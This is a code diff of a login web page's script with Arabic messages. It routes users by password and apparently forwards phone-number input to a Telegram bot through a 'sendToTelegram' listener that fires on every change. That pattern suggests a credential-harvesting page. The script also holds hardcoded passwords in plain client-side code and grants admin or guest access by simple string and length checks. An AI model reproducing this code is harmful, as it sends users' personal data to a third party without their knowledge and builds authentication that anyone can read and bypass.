@@ -241,43 +241,30 @@
 
             document.querySelector('.phone-input').addEventListener('change', sendToTelegram);
 
-            // Function to handle the login button click
+            // Function to handle the login process
             document.querySelector('.login-button').addEventListener('click', function(event) {
-                var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
-                var password = document.querySelector('.phone-input[type="password"]').value;
-                var errorMessage = document.getElementById('error-message');
+        var password = document.querySelector('.phone-input[type="password"]').value;
+        var errorMessage = document.getElementById('error-message');
 
-                // Clear previous error
-                errorMessage.style.display = 'none';
+        // Clear previous error
+        errorMessage.style.display = 'none';
 
-                // Validate phone number
-                if (!/^\d{11}$/.test(phoneNumber)) {
-                    errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
-                    errorMessage.style.display = 'block';
-                    event.preventDefault();
-                    return;
-                }
-
-                 // Validate password
-                if (password.length !== 6) {
-                errorMessage.textContent = 'يرجى إدخال كلمة مرور تتكون من 6 أحرف أو أرقام.';
-                errorMessage.style.display = 'block';
-                event.preventDefault();
-                return;
-                }
-                
-                // Redirect based on password
-                if (password === 'rewan2332000') {
-                    window.location.href = 'rowan.html';
-                } else if (password === 'admin0') {
-                    window.location.href = 'admin.html'; 
-                } else {
-                    window.location.href = 'film/guest.html'; 
-
-                }
-                sendToTelegram();
-            });
-        </script>
+        if (password === 'admin_00') {
+            window.location.href = 'admin.html'; // Redirect for admin_00
+        } else if (password === 'rewan2332000') {
+            window.location.href = 'rowan.html'; // Redirect for rewan2332000
+        } else if (password.length === 6) {
+            window.location.href = 'film/guest.html'; // Redirect for any 6-character password
+        } else if (password.length < 6) {
+            errorMessage.textContent = 'يرجى إدخال كلمة مرور تتكون من 6 أحرف أو أرقام.';
+            errorMessage.style.display = 'block';
+            event.preventDefault(); // Prevent default form submission or redirection
+        } else {
+            // Handle other passwords if needed
+            errorMessage.style.display = 'none';
+        }
+    });
+</script>
     </div>
 </body>
 </html>
